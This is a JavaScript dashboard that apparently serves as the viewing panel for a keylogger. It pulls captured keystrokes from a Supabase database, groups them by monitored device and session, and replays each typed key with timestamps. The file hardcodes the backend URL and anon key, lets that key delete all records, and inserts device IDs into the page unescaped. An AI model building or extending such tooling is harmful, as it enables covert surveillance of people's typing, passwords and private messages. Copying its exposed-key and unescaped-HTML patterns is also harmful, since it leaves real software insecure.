const SUPABASE_URL = 'https://wupzvxcsvcugxldymezi.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind1cHp2eGNzdmN1Z3hsZHltZXppIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODMzNTE0NTEsImV4cCI6MjA5ODkyNzQ1MX0.35y_5d6UOjkw2OksJu6bAlUYvyuQyLAZRhiMYNhyQQA';

let selectedDevice = null;
let selectedSession = null;

// Load initial data
loadStats();
loadDevices();

// Event listeners
document.getElementById('refreshBtn').addEventListener('click', () => {
  loadStats();
  loadDevices();
});

document.getElementById('backBtn').addEventListener('click', () => {
  if (selectedSession) {
    // Back to sessions
    selectedSession = null;
    document.getElementById('keystrokesSection').classList.add('hidden');
    document.getElementById('sessionsSection').classList.remove('hidden');
  } else if (selectedDevice) {
    // Back to devices
    selectedDevice = null;
    document.getElementById('sessionsSection').classList.add('hidden');
    document.getElementById('devicesSection').classList.remove('hidden');
    document.getElementById('backBtn').classList.add('hidden');
    document.getElementById('statsSection').classList.remove('hidden');
    document.getElementById('headerSubtitle').textContent = 'All monitored keyboard activity';
  }
});

document.getElementById('clearBtn').addEventListener('click', async () => {
  if (!confirm('Delete ALL data? This cannot be undone.')) return;

  await fetch(`${SUPABASE_URL}/rest/v1/keystroke_logs?id=neq.00000000-0000-0000-0000-000000000000`, {
    method: 'DELETE',
    headers: {
      'apikey': SUPABASE_ANON_KEY,
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      'Prefer': 'return=minimal'
    }
  });

  await fetch(`${SUPABASE_URL}/rest/v1/typing_sessions?id=neq.00000000-0000-0000-0000-000000000000`, {
    method: 'DELETE',
    headers: {
      'apikey': SUPABASE_ANON_KEY,
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      'Prefer': 'return=minimal'
    }
  });

  loadStats();
  loadDevices();
});

async function loadStats() {
  // Total keystrokes
  const ksResponse = await fetch(`${SUPABASE_URL}/rest/v1/keystroke_logs?select=count`, {
    headers: {
      'apikey': SUPABASE_ANON_KEY,
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      'Prefer': 'count=exact'
    }
  });

  const totalKs = ksResponse.headers.get('content-range')?.split('/')[1] || 0;
  document.getElementById('totalKeystrokes').textContent = totalKs;

  // Today's keystrokes
  const today = new Date().toISOString().split('T')[0];
  const todayResponse = await fetch(`${SUPABASE_URL}/rest/v1/keystroke_logs?select=count&timestamp=gte.${today}`, {
    headers: {
      'apikey': SUPABASE_ANON_KEY,
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      'Prefer': 'count=exact'
    }
  });

  const todayKs = todayResponse.headers.get('content-range')?.split('/')[1] || 0;
  document.getElementById('todayKeystrokes').textContent = todayKs;

  // Total sessions
  const sessResponse = await fetch(`${SUPABASE_URL}/rest/v1/typing_sessions?select=count`, {
    headers: {
      'apikey': SUPABASE_ANON_KEY,
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      'Prefer': 'count=exact'
    }
  });

  const totalSess = sessResponse.headers.get('content-range')?.split('/')[1] || 0;
  document.getElementById('totalSessions').textContent = totalSess;
}

async function loadDevices() {
  const response = await fetch(`${SUPABASE_URL}/rest/v1/keystroke_logs?select=device_id`, {
    headers: {
      'apikey': SUPABASE_ANON_KEY,
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
    }
  });

  const data = await response.json();

  // Group by device
  const deviceMap = {};
  data.forEach(item => {
    if (!item.device_id) return;
    if (!deviceMap[item.device_id]) {
      deviceMap[item.device_id] = { count: 0 };
    }
    deviceMap[item.device_id].count++;
  });

  // Load sessions per device
  const sessionsResponse = await fetch(`${SUPABASE_URL}/rest/v1/typing_sessions?select=device_id,id`, {
    headers: {
      'apikey': SUPABASE_ANON_KEY,
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
    }
  });

  const sessionsData = await sessionsResponse.json();
  const sessionsByDevice = {};
  sessionsData.forEach(s => {
    if (!s.device_id) return;
    if (!sessionsByDevice[s.device_id]) sessionsByDevice[s.device_id] = 0;
    sessionsByDevice[s.device_id]++;
  });

  const devices = Object.keys(deviceMap);
  document.getElementById('totalDevices').textContent = devices.length;

  const container = document.getElementById('devicesGrid');
  container.innerHTML = '';

  if (devices.length === 0) {
    container.innerHTML = '<div class="loading">No devices registered yet</div>';
    return;
  }

  devices.forEach(deviceId => {
    const card = document.createElement('div');
    card.className = 'device-card';
    card.innerHTML = `
      <div class="device-id">${deviceId}</div>
      <div class="device-stats">
        <span>Sessions: <span class="device-stat-value">${sessionsByDevice[deviceId] || 0}</span></span>
        <span>Keys: <span class="device-stat-value">${deviceMap[deviceId].count}</span></span>
      </div>
    `;
    card.addEventListener('click', () => loadDeviceSessions(deviceId));
    container.appendChild(card);
  });
}

async function loadDeviceSessions(deviceId) {
  selectedDevice = deviceId;

  // Update UI
  document.getElementById('devicesSection').classList.add('hidden');
  document.getElementById('statsSection').classList.add('hidden');
  document.getElementById('sessionsSection').classList.remove('hidden');
  document.getElementById('backBtn').classList.remove('hidden');
  document.getElementById('headerSubtitle').textContent = `Device: ${deviceId.substring(0, 20)}...`;

  const response = await fetch(`${SUPABASE_URL}/rest/v1/typing_sessions?select=*&device_id=eq.${deviceId}&order=session_start.desc`, {
    headers: {
      'apikey': SUPABASE_ANON_KEY,
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
    }
  });

  const sessions = await response.json();
  const container = document.getElementById('sessionsList');
  container.innerHTML = '';

  if (sessions.length === 0) {
    container.innerHTML = '<div class="loading">No sessions found</div>';
    return;
  }

  sessions.forEach(session => {
    const card = document.createElement('div');
    card.className = 'session-card';

    const startTime = new Date(session.session_start).toLocaleString();
    const duration = session.session_end
      ? Math.round((new Date(session.session_end) - new Date(session.session_start)) / 1000) + 's'
      : 'Active';

    card.innerHTML = `
      <div>
        <div class="session-time">${startTime}</div>
        <div class="session-meta">Duration: ${duration}</div>
      </div>
      <div class="session-keys">
        <div class="session-key-count">${session.key_count || 0}</div>
        <div class="session-key-label">keys</div>
      </div>
    `;

    card.addEventListener('click', () => loadSessionKeystrokes(session.id));
    container.appendChild(card);
  });
}

async function loadSessionKeystrokes(sessionId) {
  selectedSession = sessionId;

  // Update UI
  document.getElementById('sessionsSection').classList.add('hidden');
  document.getElementById('keystrokesSection').classList.remove('hidden');

  const response = await fetch(`${SUPABASE_URL}/rest/v1/keystroke_logs?select=*&typing_session_id=eq.${sessionId}&order=timestamp.asc`, {
    headers: {
      'apikey': SUPABASE_ANON_KEY,
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
    }
  });

  const keystrokes = await response.json();
  const container = document.getElementById('keystrokesDisplay');
  container.innerHTML = '';

  if (keystrokes.length === 0) {
    container.innerHTML = '<div class="loading">No keystrokes found</div>';
    return;
  }

  let currentTime = '';
  keystrokes.forEach(log => {
    const time = new Date(log.timestamp).toLocaleTimeString();
    if (time !== currentTime) {
      container.innerHTML += `<span class="key-timestamp">${time}</span>`;
      currentTime = time;
    }

    const key = log.key_text;
    if (key.length === 1) {
      container.innerHTML += `<span class="key-item">${escapeHtml(key)}</span>`;
    } else {
      container.innerHTML += `<span class="key-item special">[${formatSpecialKey(key)}]</span>`;
    }
  });
}

function formatSpecialKey(key) {
  const map = {
    'Backspace': '⌫', 'Enter': '↵', 'Tab': '⇥', 'Shift': '⇧',
    'Control': 'Ctrl', 'Alt': 'Alt', 'Meta': '⌘', 'Escape': 'Esc',
    'ArrowUp': '↑', 'ArrowDown': '↓', 'ArrowLeft': '←', 'ArrowRight': '→',
    'Delete': 'Del', 'CapsLock': 'Caps', ' ': 'Space'
  };
  return map[key] || key;
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}
